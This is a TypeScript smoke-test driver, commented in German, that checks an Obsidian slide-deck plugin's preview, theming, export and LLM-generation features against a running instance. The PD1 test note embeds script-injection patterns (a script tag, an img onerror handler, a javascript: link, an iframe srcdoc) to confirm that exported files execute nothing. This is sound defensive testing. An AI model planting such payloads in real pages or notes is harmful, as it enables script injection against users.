/**
 * GUI-Smoke-Treiber — faehrt die Checkliste aus `docs/SMOKE.md` gegen ein **laufendes**
 * Obsidian statt von Hand (CORE-TEST-02 b).
 *
 * Was er prueft, das die vitest-Suite strukturell nicht kann: dieses Plugin rendert seine
 * Folien in einem `sandbox="allow-same-origin"`-iframe, misst darin mit echten
 * Schrift-Metriken und exportiert aus demselben Artefakt. `vitest` laeuft hier mit
 * `environment: "node"` — kein DOM, kein iframe, keine `fonts.ready`. Alles zwischen
 * "das Deck ist geparst" und "die Folie steht im Fenster" ist deshalb bis hierher
 * ungeprueft gewesen.
 *
 * ## Voraussetzung
 *
 * Zweitinstanz mit eigenem Profil und eigenem Port, nie die regulaere Instanz (kein `quit`,
 * kein Neustart fremder Fenster). `--port` ist Pflicht.
 *
 * ```bash
 * UD=/tmp/obs-test-slide-deck; mkdir -p "$UD"
 * lsof -nP -iTCP:<port> -sTCP:LISTEN; pgrep -f "user-data-dir=$UD"      # beides leer
 * cp ~/Library/Application\ Support/obsidian/obsidian-*.asar "$UD"/      # aktuelle Version
 * # $UD/obsidian.json: {"vaults":{"sd":{"path":"$STAGING_VAULTS_DIR/slide-deck","ts":1,"open":true}},"language":"en"}
 * npm run shots:obsidian -- --setup     # baut den Staging-Vault aus docs/images/fixture/
 * npm run build && OBSIDIAN_PLUGIN_DIR="$STAGING_VAULTS_DIR/slide-deck/.obsidian/plugins/slide-deck" npm run deploy
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label slide-deck --intent "GUI-Smoke" --exclusive focus --port <port> --ttl 300
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=<port> &
 * npm run smoke:gui -- --port <port>
 * npm run smoke:gui -- --port <port> --section vorschau --keep
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 * ```
 *
 * Vertrauensdialog, Restricted Mode und Aktivierung erledigt `bereiteInstanzVor` im Treiber.
 * Je Messlauf ein frischer Prozess; der erste Lauf nach einer Profilanlage ist ein Aufwaermlauf.
 * Flags: `--vault <name>` (Default `slide-deck`), `--section <key>`, `--keep`, `--with-model`
 * (G1/G2 gegen einen echten Endpunkt; ohne das Flag sind sie `skipped`).
 *
 * Exit 0 gruen/uebersprungen, 1 bei Rot oder „nichts gemessen", 2 bei Abbruch.
 *
 * Der Vault entsteht aus dem getrackten Fixture (`docs/images/fixture/`), damit dieser Lauf nicht
 * vom Arbeitsvault abhaengt.
 */

import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { deflateSync } from "node:zlib";
import { join } from "node:path";
import {
  AbbruchAusnahme,
  Cdp,
  attachTo,
  beimAbbruch,
  bereiteInstanzVor,
  clearNotices,
  closeExtraLeaves,
  entferneFakeManager,
  installFakeManager,
  istAbgebrochen,
  ladePluginNeu,
  notices,
  openExisting,
  pollUntil,
  releaseAlwaysOnTop,
  requireVisible,
  setPluginSetting,
  schliesseEinstellungen,
} from "../../tools/obsidian-cdp/cdp.js";
import { messeFolge, zeichneFolge } from "../../tools/obsidian-cdp/folge.js";
import { gegenprobeErreichbarkeit, gegenprobeFokus, messeDenkblockKopierbar, messeErreichbarkeit, messeFokusErhalt, mitHoehe, zeichneDenkblock, type DenkblockUrteile, type PflichtBilanz, type PflichtTeilurteil } from "../../tools/obsidian-cdp/pflichtpunkte.js";
import { createBilanz, parseArgs, runDriver, type Bilanz } from "../../tools/obsidian-cdp/bilanz.js";
import { startLlmStub, type LlmStub, type StubAnfrage, type ZusatzAntwort, type ModellEintrag } from "../../tools/obsidian-cdp/llm-stub.js";
import { boxOf, capture } from "../../tools/obsidian-cdp/shot.js";
// Das Woerterbuch selbst, nicht eine Kopie seiner Form: daraus kommen sowohl die exakten
// Schluessel als auch die Praefix-Liste fuer B2. Eine im Treiber gepflegte Musterliste waere
// beim naechsten neuen Namensraum still blind — und genau diese Sorte Blindheit misst B2.
import { STRINGS_DE, STRINGS_EN } from "../src/i18n";
import { MODES } from "../src/vendor/kit/sampling-profiles";
import { renderMarkdown } from "../src/vendor/deck-core/pure/render/md2html";
// Die Texte des Endpunkt-Abschnitts kommen seit dem Verbindungs-Tausch aus dem Kit, nicht mehr aus i18n.ts.
import { LLM_CONNECTION_STRINGS_DE, LLM_CONNECTION_STRINGS_EN } from "../src/vendor/kit-obsidian/llm-connection-strings";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";

const PLUGIN_ID = "slide-deck";

/** Die Verbindung merkt ihre lokale Aufloesung bis `invalidate()`. Wer die Endpunkt-Liste oder das Modell
 *  im Renderer direkt in die Settings schreibt (`setPluginSetting`, `p.settings.… =`), muss sie vergessen
 *  lassen — sonst misst der Punkt noch den alten Endpunkt, und zwar gruen. */
const verbindungNeu = (cdp: Cdp): Promise<unknown> =>
  cdp.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].llm.invalidate(); return true;`);
// Seit Welle 6 (Hub-Tab-Leiste, `src/hub-view.ts`): ein View-Typ fuer Vorschau UND Erzeugen,
// Tabs statt getrennter Leaves. Alle Pruefpunkte unten suchen weiterhin per Klassen-Selektor
// (`.sd-message`, `.sd-warn`, …) innerhalb `leaf.view.containerEl` — das findet sie unabhaengig
// davon, ob sie eine Ebene tiefer im Hub-Panel liegen. `openPreview()` schaltet den Tab explizit.
const VIEW_TYPE = "slide-deck-hub";
/** Fixture-Notizen (docs/images/fixture/notes/ — buildVault legt sie flach in den Vault). */
const DECK_NOTE = "Quarterly Review.md";
const OVERFLOW_NOTE = "Overflow example.md";
/** Die Folienzahl steht im Fixture, nicht im Code: fuenf `---`-getrennte Abschnitte. */
const DECK_SLIDES = 5;
/** Der Pruefling fuer die 0.5.0-Regressionen (eigener Layoutname, Modifier, Bild in Spalten).
 *  Er liegt getrackt unter docs/themes/ und wird zur LAUFZEIT in den Vault geschrieben, statt
 *  als zweite Kopie im Fixture zu liegen — eine Kopie hiesse: die Quelle aendert sich, der
 *  Smoke misst weiter den alten Stand und meldet ihn als aktuell. */
const REGRESSION_SRC = join("docs", "themes", "regression-deck.md");
const REGRESSION_NOTE = "Regression deck.md";
const REGRESSION_SLIDES = 5;
/** Folien-Indizes (0-basiert) im Regressions-Deck, aus der Datei abgelesen. */
const REGRESSION_MOD_SLIDE = 3;      // D · `<!-- layout: default sand -->` → .sd-mod-sand
const REGRESSION_CUSTOM_LAYOUT = 4;  // E · `<!-- layout: tagesordnung -->` → info, kein Streifen
/** Was der Modifier im Export sichtbar machen soll: eine Farbe, die kein Theme traegt. */
const MOD_PROBE_CSS = ".sd-slide.sd-mod-sand { background: #d81b60 !important; }";
const MOD_PROBE_RGB: [number, number, number] = [216, 27, 96];

/** Abschnitt M — der Ordner-Theme-Pruefling. Eigene Probefarbe, bewusst NICHT die des
 *  Modifiers: taeuchten in einem Protokoll zwei Punkte mit derselben Farbe auf, waere bei
 *  einem roten Lauf nicht mehr zu sehen, welcher Weg sie dorthin gebracht hat. */
const MERMAID_THEME_KEY = "zz-mermaid-probe";
const MERMAID_NOTE = "Mermaid probe.md";
const MERMAID_PROBE_RGB: [number, number, number] = [0, 131, 143];

/** M3 — die Segmentfarbe des `pie`-Pruflings. Wieder eine eigene: M1/M2 messen die
 *  ABGELEITETE Farbe (Token → Mermaid), M3 die DEKLARIERTE (`sd-mermaid-var`). Traegen beide
 *  dieselbe Farbe, belegt ein gruenes M3 nicht mehr, dass die Deklaration ueberhaupt
 *  gegriffen hat — die Ableitung haette denselben Wert geliefert. */
const PIE_NOTE = "Mermaid pie probe.md";
const PIE_PROBE_RGB: [number, number, number] = [255, 87, 34];
/** Ab wie vielen voll deckenden Pixeln das Segment als "durchgetragen" gilt. Die einmalige
 *  Messung vom 2026-09-04 lieferte 245.306 mit und 2.025 ohne die Direktive; die Schwelle
 *  liegt zwei Groessenordnungen unter dem Ja-Fall und eine ueber dem Nein-Fall, damit weder
 *  ein anderes Folienformat noch ein Antialias-Saum sie kippt. */
const PIE_VOLL_MIN = 20_000;

/** M4 — der `sender:`-Slot. Der Text ist absichtlich unverwechselbar: er wird im
 *  gerenderten Deck per `textContent` gesucht, und ein Allerweltswort koennte aus einer
 *  Fuss- oder Kopfzeile stammen. */
const SENDER_NOTE = "Sender probe.md";
const SENDER_TEXT = "Zz Probe Absender";

/** M5 — der theme-eigene Modifier. NICHT `sand` wie im Regressions-Deck (A8/D2): derselbe
 *  Name in zwei Punkten macht eine rote Zeile mehrdeutig. */
const MOD_NOTE = "Modifier probe.md";
const THEME_MOD = "zzprobe";

interface ThemeOpts {
  /** ausdrueckliche `sd-mermaid`-Angabe (M2) */
  pin?: boolean;
  /** `/* sd-modifiers: … *\/` deklarieren (M5) */
  modifiers?: readonly string[];
  /** `pie1` auf die Probefarbe setzen (M3 — beide Faelle) */
  pie?: boolean;
  /** zusaetzlich `pieOpacity 1` (M3 — nur der Ja-Fall) */
  pieOpacity?: boolean;
}

/** Das Ordner-Theme des Pruefpunkts. Zwei Eigenschaften sind Absicht, nicht Zufall:
 *  die Farbe kommt ueber eine `var()`-Kette, und `--sd-surface` ist zweimal deklariert.
 *  Genau daran waere der billigere Weg gescheitert, der bei der Entscheidung zur Wahl stand
 *  (Regex im Pure-Core): er haette den Literaltext "var(--probe-akzent)" an Mermaid gereicht
 *  und die zweite Deklaration nicht als Sieger der Kaskade erkannt. `getComputedStyle` loest
 *  beides auf, weil der Browser es ohnehin tut. Der Pruefpunkt misst damit nicht nur, DASS
 *  die Ableitung wirkt, sondern den Fall, fuer den sie so gebaut wurde.
 *
 *  Die vier Schalter erzeugen die Faelle von M1–M3 und M5 aus EINER Quelle. Getrennte
 *  Vorlagen waeren die naheliegende Alternative und die schlechtere: die Punkte messen
 *  Unterschiede zwischen zwei Faellen, und zwei Vorlagen koennen unbemerkt in mehr als dem
 *  gemessenen Merkmal auseinanderlaufen. */
function mermaidThemeCss(opts: ThemeOpts = {}): string {
  const kopf = [
    opts.pin ? "/* sd-mermaid: dark */" : "",
    opts.modifiers?.length ? `/* sd-modifiers: ${opts.modifiers.join(" ")} */` : "",
    opts.pie ? `/* sd-mermaid-var: pie1 ${rgbCss(PIE_PROBE_RGB)} */` : "",
    opts.pieOpacity ? "/* sd-mermaid-var: pieOpacity 1 */" : "",
  ].filter(Boolean);
  return `${kopf.map((z) => z + "\n").join("")}/* sd-base: 24px */
:root { --probe-akzent: #00838f; --probe-tinte: #101014; }
.sd-slide {
  --sd-surface: #999999;
  --sd-surface: var(--probe-akzent);
  --sd-fg: var(--probe-tinte);
  --sd-muted: #5a5a66;
  --sd-bg: #fdfdfd;
  --sd-code-bg: #eceff4;
  --sd-font: "Inter", sans-serif;
  background: var(--sd-bg);
  color: var(--sd-fg);
}
.sd-slide.sd-mod-${THEME_MOD} { letter-spacing: 0.01em; }
`;
}

function rgbCss(rgb: [number, number, number]): string {
  return "#" + rgb.map((v) => v.toString(16).padStart(2, "0")).join("");
}

/** Die Pruefnotiz: eine Folie, ein Mermaid-Block, das Ordner-Theme in der Frontmatter. */
const MERMAID_NOTE_MD = `---
theme: ${MERMAID_THEME_KEY}
---

# Mermaid probe

\`\`\`mermaid
flowchart LR
  A[Erste] --> B[Zweite]
\`\`\`
`;

/** M3 — EIN Segment, damit die gemessene Flaeche der Vollkreis ist und nicht davon abhaengt,
 *  wohin Mermaid welchen Sektor legt. Gezaehlt werden Pixel im ganzen Bild, nicht an einer
 *  Koordinate: wo der Kreis im PNG sitzt, haengt an Diagrammgroesse und Layout, die Menge
 *  seiner Pixel nicht. */
const PIE_NOTE_MD = `---
theme: ${MERMAID_THEME_KEY}
---

\`\`\`mermaid
pie
  "Anteil" : 100
\`\`\`
`;

/** M4 — `sender:` traegt einen eigenen Slot; `header:` steht daneben, damit der Punkt nicht
 *  gruen wird, weil ueberhaupt kein Slot gerendert wird. */
const SENDER_NOTE_MD = `---
sender: ${SENDER_TEXT}
header: Zz Probe Kopf
---

# Sender probe

Eine Folie, zwei Slots.
`;

/** M5 — ein Modifier, den der Kern nicht kennt und das Theme deklariert. */
const MOD_NOTE_MD = `---
theme: ${MERMAID_THEME_KEY}
---

<!-- layout: default ${THEME_MOD} -->

# Modifier probe

Der Modifier steht im Theme, nicht im Kern.
`;

// --- Protokoll ---------------------------------------------------------------

/** DT1 — die Zeile „Denk-Test“ im Einstellungs-Tab bei einem Claude-Endpunkt. Name hier, weil ihn die Soll-Liste und der Punkt teilen. */
const MZ1_NAME = "MZ1 Modellzeile im Erzeugen-Fenster: die Modelle des Endpunkts stehen da, ein Wechsel gilt in der Verbindung und in der Einstellung (Tab und Zeile stimmen ueberein)";
const MZ2_NAME = "MZ2 Das gewaehlte Modell steht im Anfrage-Body des Laufs und im Frontmatter model: der erzeugten Notiz";
const MZ3_NAME = "MZ3 Denk-Knopf in der Zeile schaltet request.thinking.creative; bei Claude steht \"Thinking: lowest level\" mit Hinweis im aria-label";
const MZ4_NAME = "MZ4 Ein Modellwechsel rechnet die Kontext-Warnung neu (kleines Modell: Warnung mit seiner Grenze, grosses: keine)";
const MZ5_NAME = "MZ5 Endpunkt ohne Modell-Liste: die Zeile zeigt Automatisch mit Hinweis, der Knopf Erzeugen bleibt bedienbar";
const MZ6_NAME = "MZ6 Sperre: laeuft anderswo schon eine Erzeugung, ist die Zeile gesperrt (Gegenprobe: ohne Lauf bedienbar)";
const CX1_NAME = "CX1 Kontextgrenze bei Claude: die Grenze kommt aus /v1/models (max_input_tokens 200000), keine Warnung fuer 32.800 Zeichen; Gegenprobe 4000 warnt mit \"vs 4000\"";
const TR1_NAME = "TR1 Der Einstellungs-Tab baut bei jedem Oeffnen neu auf (der Haken von installTabRefreshOnOpen bleibt nach hide() stehen): je Oeffnen mindestens ein Aufbau";
const DT1_NAME = "DT1 Denk-Test: bei einem Claude-Endpunkt steht die Zeile nicht im Tab, auch nicht nach einem Wechsel im geoeffneten Tab (Gegenprobe: ohne Manager steht sie da)";

/** PD1 — der mobile PDF-Export (lose HTML-Datei im Vault). Name hier, weil ihn die Soll-Liste und der Punkt teilen. */
const PD1_NAME = "PD1 Mobiler PDF-Export: die lose Datei fuehrt kein Skript aus (Gegenprobe: ohne Policy laufen alle vier Muster), Bild, Formel und Diagramm bleiben";
const PD1_NOTE = "smoke-pd1.md";
/** Rotes PNG (160x90) als data:-URI. markdown-it laesst als `data:`-Bild nur gif/png/jpeg/webp durch, kein SVG:
 *  ein SVG-Bild bliebe als Text stehen und der Punkt zaehlte 0 Bilder (erster Lauf, 2026-10-25). */
function pd1RotPng(): string {
  const crcTab = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
  const crc = (b: Buffer): number => { let c = 0xffffffff; for (const x of b) c = crcTab[(c ^ x) & 0xff]! ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
  const chunk = (typ: string, data: Buffer): Buffer => {
    const kopf = Buffer.alloc(4); kopf.writeUInt32BE(data.length);
    const tc = Buffer.concat([Buffer.from(typ, "ascii"), data]);
    const fuss = Buffer.alloc(4); fuss.writeUInt32BE(crc(tc));
    return Buffer.concat([kopf, tc, fuss]);
  };
  const w = 160, h = 90;
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;
  const zeile = Buffer.concat([Buffer.from([0]), Buffer.from(Array.from({ length: w }, () => [216, 27, 96]).flat())]);
  const roh = Buffer.concat(Array.from({ length: h }, () => zeile));
  const png = Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk("IHDR", ihdr), chunk("IDAT", deflateSync(roh)), chunk("IEND", Buffer.alloc(0))]);
  return `data:image/png;base64,${png.toString("base64")}`;
}
/** Vier Muster aus der Notiz, je eines setzt eine eigene Marke `window.__pd_<name>` im Rahmen, in dem die Datei laeuft
 *  (eine gemeinsame Liste hat sich im ersten Lauf gegenseitig ueberschrieben). Das iframe-Muster fuehrt ueber `srcdoc`
 *  aus (`parent.…`): eine Fernquelle brauchte Netz, der Weg ist derselbe. */
const PD1_MARKE = (name: string): string => `window.__pd_${name} = 1`;
const PD1_MD = [
  "---", "theme: kami", "---", "",
  "# PD1 Probe", "",
  `<script>${PD1_MARKE("script")}</script>`, "",
  `<img src="x" onerror="${PD1_MARKE("onerror")}">`, "",
  `<a id="pd-link" href="javascript:${PD1_MARKE("link")}">Link</a>`, "",
  `<iframe srcdoc="&lt;script&gt;parent.${PD1_MARKE("iframe")}&lt;/script&gt;"></iframe>`, "",
  "---", "",
  "# Bleibt", "",
  `![](${pd1RotPng()})`, "",
  "$$E = mc^2$$", "",
  "```mermaid", "graph LR", "  A[Eins] --> B[Zwei]", "```", "",
].join("\n");

/** Soll-Liste je Abschnitt — der Nenner der Bilanz (CORE-TEST-19). Ein Punkt, der nie aufgezeichnet
 *  wird (Abschnitt abgebrochen), zaehlt als „nichts gemessen" und setzt Exit 1; er erscheint nie
 *  als gruen. Bei `--section` gilt die Teilmenge der gewaehlten Abschnitte. „PDF-Export" und
 *  G1/G2 ohne `--with-model` bleiben `skipped` (nicht anwendbar), sie zaehlen im Nenner mit. */
const ABSCHNITT_PUNKTE: Record<string, readonly string[]> = {
  vorschau: [
    "A1 Vorschau oeffnet in der rechten Seitenleiste",
    `A2 Deck rendert im isolierten iframe (${DECK_SLIDES} Folien erwartet)`,
    "A3 Vault-Theme erreicht die Folien nicht",
    "A4 Code-Hervorhebung erreicht den iframe",
    "A5 Overflow wird gewarnt, nicht beschnitten",
    "A6 Overflow-Folie traegt den roten Streifen, Warnzeile den Schwere-Namen als title",
    "A7 Theme-Dropdown wirkt sofort und laesst die Notiz in Ruhe",
    "A8 Eigener Layoutname: Hinweiszeile (info), aber kein Streifen an der Folie",
  ],
  mermaid: [
    "M1 Ordner-Theme faerbt das Diagramm ueber seine Tokens",
    "M2 sd-mermaid-Angabe schlaegt die Token-Ableitung",
    "M4 sender-Slot steht sichtbar im Deck (und fehlt ohne die Direktive)",
    `M5 Theme-eigener Modifier "${THEME_MOD}" warnt nicht (ohne Deklaration schon)`,
    "M3 sd-mermaid-var traegt bis ins PNG (pieOpacity 1 gegen Mermaids 0.7)",
  ],
  einstellungen: [
    "B1 Einstellungen-Tab oeffnet",
    "B2 Kein roher i18n-Schluessel in der Oberflaeche",
    "B3 Endpunkt-Zeileneditor ist verdrahtet",
    "B3b Hilfe-Zeile ist die erste Zeile im Einstellungs-Tab",
    "B4 Altwert llmModel zieht einmal in die Zeile ohne Modell; keine Zeile \"Model\", keine Option \"global model\"",
    "B5 KI-Settings-Bloecke stapeln, statt eine Flex-Row zu werden",
  ],
  quelle: [
    "E1 Manager an: Settings zeigen den Manager-Baustein statt der lokalen Liste",
    "E1b Manager an: die Beschreibung der alten globalen Modell-Zeile steht nirgends im Tab",
    "E2 Manager an: die Aufloesung nimmt Manager-Endpunkt und Default-Modell",
    "E3b Manager aus: auch ohne Manager steht die alte Modell-Zeile nirgends (das Modell steht in der Endpunkt-Zeile)",
    "E3 Manager aus: lokale Liste in Settings und Aufloesung (Gegenprobe zu E1/E2)",
  ],
  explorer: [
    "C1 Themes-Ordner ist im Explorer ausgeblendet",
    "C2 Ausschalten macht ihn wieder sichtbar",
    "C3 Bei fokussiertem Pop-out liegt das Blatt im Hauptfenster, nicht im Pop-out",
  ],
  export: [
    "PDF-Export",
    `D1 Bilder-Export schreibt ${DECK_SLIDES} PNG in den Export-Ordner`,
    `D2 Modifier-Klasse ueberlebt den Export (Folie ${REGRESSION_MOD_SLIDE + 1} traegt die Probe-Farbe im PNG)`,
    PD1_NAME,
  ],
  bild: [
    "N1 Bildplatz rendert als .sd-image-slot",
    "N2 Nach Klick: Knopf bleibt bedienbar (heilbarer Grund) + Klassen da mit API, Empty-State (keine Klassen) ohne",
    "N2b Rueckschreib-Mechanik: Objektidentitaet gewahrt (mit Waechter) und Slot leer (ohne)",
    "N3 is-checking bewegt sich, is-ok steht",
    "N4 Zurueckschreiben trifft, und unterbleibt bei geaendertem Block",
  ],
  chat: [
    "G3 Fehlerkoerper: HTTP 200 + Fehler-Body auf dem Chat-Weg wird zur Meldung (umgeschrieben)",
    "G1 Streaming: Deck aus einer Notiz, Text kommt in mehreren Stuecken",
    "G2 Abbruch: Stop beendet die Generierung zuegig, es wird nichts geschrieben",
    "G4 Folge-Regel: Hochscrollen mitten im Strom des Erzeugen-Panels wird respektiert",
    "G5 Kontrolle: ohne Stoerung folgt der Strom des Erzeugen-Panels bis zum Ende",
    "G6 Denkblock live: der Denk-Text steht waehrend des Stroms offen und waechst",
    "G7 Kontrolle mit Absatzwechseln: der Strom folgt auch, wenn ein Stueck mehrere Zeilen auf einmal bringt",
    "G8 Wiederaufnahme: steht der Nutzer nach dem Hochscrollen wieder unten, folgt der Strom wieder",
    "G9 Ein nachtraeglich eingerichteter Endpunkt wird beim Zurueckschalten auf den Tab erkannt (Knopf wird aktiv)",
    "G10 Gemma 4 ohne Oeffner: der Denktext steht im Denkblock, nicht im Antwortbereich",
    "G11 Denkblock kopierbar: der Kopier-Knopf erscheint erst mit Denk-Text, kopiert ihn in die Zwischenablage, quittiert am Knopf und klappt den Block nicht um",
    "G11b Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht",
    "G12 Pflicht (a): das Eingabefeld des Erzeugen-Panels behaelt den Fokus, wenn ein Neuzeichnen ausgeloest wird",
    "G13 Pflicht (a), Gegenprobe: ein Neuzeichnen mit Fokusverlust macht G12 rot",
    "G14 Pflicht (b): im laufenden Strom ist jedes Bedienelement erreichbar (natuerliche Hoehe, Strom ueber der Obergrenze)",
    "G15 Pflicht (b): auch im kurzen Panel (420 px) ist jedes Bedienelement erreichbar",
    "G16 Pflicht (b), Gegenprobe: ohne Rollbalken wird etwas unerreichbar",
  ],
  anfrage: [
    "R1 Abschnitt „Anfrage“ klappt auf und wieder zu",
    "R2 Wert ueberschreiben, dann zuruecksetzen — der Abschnitt bleibt aufgeklappt (zwei Edits hintereinander)",
    "R3 Zeile „Denk-Test“ folgt dem Anfrage-Abschnitt, mit Knopf statt Schalter (umgeschrieben)",
    "R4 Denkstufe waehlen wird gespeichert, der Abschnitt bleibt aufgeklappt",
    "R5 Der gesendete Body traegt das Profil des Modus creative (Temperatur aus den Kit-Tabellen, Budget als max_tokens)",
  ],
  verbindung: [
    "V1 Schluesselbund: nach dem Aufloesen steht kein apiKey mehr in data.json, der Aufrufer bekommt ihn hydriert",
    "V2 Bearer: der Schluessel aus dem Schluesselbund geht als Authorization-Header hinaus",
    "V3 Schwaerzung: das Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
    "V4 Entschaerfung: Markdown-Bild in der erzeugten Notiz laedt nichts von aussen (Gegenprobe: ohne sie laedt es)",
    "V5 Entschaerfung: rohes <img> in der erzeugten Notiz laedt nichts von aussen (Gegenprobe: ohne sie laedt es)",
    "V6 Entschaerfung: url() in style in der erzeugten Notiz laedt nichts von aussen (Gegenprobe: ohne sie laedt es)",
    "V7 Entschaerfung: ein dataviewjs-Block steht in der erzeugten Notiz nicht mehr als Prozessor-Fence (Gegenprobe: die Antwort hatte ihn)",
    "V8 Entschaerfung laesst ein normales Deck unveraendert: Direktive, Datei-Embed, Mermaid, data:-Bild und Link bleiben",
    "V9 Zweite Schicht: eine Fernquelle, die die Regex-Schicht uebersieht (SVG fill=url), erzeugt keine Anfrage am Draht (Gegenprobe: die rohe Antwort schon)",
    "V10 Zweite Schicht: nur die betroffene Folie wird Text, die Nachbarfolie bleibt",
    "V12 Zweite Schicht je Region: ein offenes <textarea> in Region 1 versteckt die Fernquelle in Region 2 nicht (Gegenprobe: das rohe Deck laedt in der Vorschau)",
    "V13 Zweite Schicht: Mermaid-Bildform `A@{ img: \"https://…\" }` erzeugt in der Vorschau keine Anfrage (Gegenprobe: das rohe Deck laedt)",
    "V11 Eigenes Deck mit Fernbild laedt in der Vorschau weiter (Variante A: die zweite Schicht greift nur beim Erzeugen)",
    "CL1 Claude im Manager: der Endpunkt kommt nur mit Opt-in, das Plugin waehlt ihn (Backend anthropic, Familie claude)",
    "CL2 Erzeugen gegen den Claude-Stub: Messages-API mit Schluessel und Browser-Header, ohne temperature, das Deck kommt an, das Denken laeuft in den Zustand",
    "CL3 Fehler der API (529): die Erzeugung endet mit dem Fehler, keine Notiz wird geschrieben",
    DT1_NAME,
    MZ1_NAME,
    MZ2_NAME,
    MZ3_NAME,
    MZ4_NAME,
    MZ5_NAME,
    MZ6_NAME,
    CX1_NAME,
    TR1_NAME,
  ],
};

const C0 = "0. Kein liegen gebliebener local-image-generator-Stub aus einem abgebrochenen Vorlauf";

/** Wird in `main()` mit der Soll-Liste der gewaehlten Abschnitte angelegt. */
let bilanz: Bilanz;

function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name, passed, detail);
}

/** Was der Lauf bewusst NICHT misst, weil es hier nicht anwendbar ist (Systemdialog, Flag
 *  `--with-model` fehlt). Fehlt dagegen der Gegenstand (Abschnitt abgebrochen), ist es
 *  „nichts gemessen" — das setzt der Abschnittsfang in `main()`. */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name, reason);
}

// --- Helfer ------------------------------------------------------------------

/** Vom Lauf angelegte Ordner und Notizen — im `finally` in den PAPIERKORB, nie hart geloescht. */
const erzeugtePfade: string[] = [];

/** Ausdruck, der im Renderer das Deck-iframe der Vorschau greift. Immer ueber den
 *  plugin-eigenen Anker (`.sd-deck-iframe` im Container der eigenen View), nie ueber eine
 *  nackte Obsidian-Klasse — sonst misst der Punkt irgendein fremdes iframe und ist
 *  gruen am Falschen. */
const DECK_DOC = `
  const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
  const frame = leaf && leaf.view.containerEl.querySelector("iframe.sd-deck-iframe");
  const deck = frame && frame.contentDocument;
`;

/** Die Vorschau oeffnen und warten, bis wirklich Folien darin stehen — der Blattwechsel
 *  allein beweist nichts, die View existiert vor ihrem ersten Rendern.
 *  Form uebernommen aus `scripts/shots-obsidian.ts` (openPreview), wo sie erprobt ist:
 *  ohne das `refresh()` zeigt die Vorschau das zuletzt gerenderte Deck weiter und der
 *  Lauf misst die vorige Notiz, waehrend er Erfolg meldet. */
async function openPreview(cdp: Cdp, note: string): Promise<number> {
  if (!(await openExisting(cdp, note, "source"))) throw new Error(`Notiz fehlt im Vault: ${note}`);
  await cdp.evaluate(`
    await app.commands.executeCommandById("${PLUGIN_ID}:open-preview");
    const rechts = app.workspace.rightSplit;
    if (rechts) {
      if (rechts.collapsed) rechts.expand();
      if (typeof rechts.setSize === "function") rechts.setSize(640);
    }
    await new Promise((r) => setTimeout(r, 900));
    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
    if (leaf && typeof leaf.view.refresh === "function") await leaf.view.refresh();
    return true;
  `);
  const folien = await pollUntil<number>(cdp, `
    ${DECK_DOC}
    return deck ? deck.querySelectorAll(".sd-slide").length : 0;
  `, 25_000);
  return folien ?? 0;
}

/** Der sichtbare Meldungstext des Pruflings, mitzuliefern bei JEDEM Fehlschlag
 *  (CORE-TEST-14): eine Bilanzzeile "0 Folien" neben einem ungelesenen Klartext ist eine
 *  Fehldiagnose mit Zahl. `.sd-message` traegt hier den Grund, `.sd-warn` die Warnungen. */
async function diagnose(cdp: Cdp): Promise<string> {
  return cdp.evaluate<string>(`
    ${DECK_DOC}
    const meldung = leaf ? leaf.view.containerEl.querySelector(".sd-message") : null;
    const teile = [
      "vault=" + app.vault.getName(),
      "datei=" + (app.workspace.getActiveFile() ? app.workspace.getActiveFile().path : "-"),
      "vorschau=" + Boolean(leaf),
      "folien=" + (deck ? deck.querySelectorAll(".sd-slide").length : 0),
    ];
    const text = meldung && meldung.textContent.trim();
    if (text) teile.push("meldung=" + JSON.stringify(text));
    return teile.join(" · ");
  `);
}

/** Den Regressions-Pruefling in den Vault schreiben (oder auf den Repo-Stand bringen) und
 *  fuer den Papierkorb vormerken. Der Inhalt geht als String durch CDP — 42 KB, die Bilder
 *  stecken als data:-URI darin, deshalb braucht der Pruefling weder Assets noch Netz. */
async function ensureRegressionNote(cdp: Cdp): Promise<void> {
  const inhalt = readFileSync(join(process.cwd(), REGRESSION_SRC), "utf8");
  const angelegt = await cdp.evaluate<boolean>(`
    const pfad = ${JSON.stringify(REGRESSION_NOTE)};
    const inhalt = ${JSON.stringify(inhalt)};
    const da = app.vault.getAbstractFileByPath(pfad);
    if (da) { await app.vault.modify(da, inhalt); return false; }
    await app.vault.create(pfad, inhalt);
    await new Promise((r) => setTimeout(r, 600));
    return true;
  `);
  if (angelegt) erzeugtePfade.push(REGRESSION_NOTE);
}

/** Die Theme-Registry neu einlesen und die offene Vorschau nachziehen. Das Plugin tut das
 *  von sich aus bei `create`/`delete`/`rename` unter dem Themes-Ordner — aber NICHT bei
 *  `modify`, und M2 aendert eine bestehende Datei. Ohne diesen Aufruf misst M2 das Theme
 *  von M1 und ist gruen, ohne seinen Gegenstand je gesehen zu haben. */
async function refreshThemes(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    const plugin = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    if (typeof plugin.refreshThemes === "function") await plugin.refreshThemes();
    await new Promise((r) => setTimeout(r, 800));
    return true;
  `);
}

interface MermaidKnoten { fill: string; knoten: number }

/** Die Fuellfarbe der Mermaid-Knoten aus dem GERENDERTEN SVG im Deck-iframe.
 *
 *  `getComputedStyle`, nicht das `fill`-Attribut: Mermaid schreibt seine Farben teils als
 *  Attribut, teils in ein `<style>` innerhalb der Grafik, und welchen Weg es waehlt, haengt
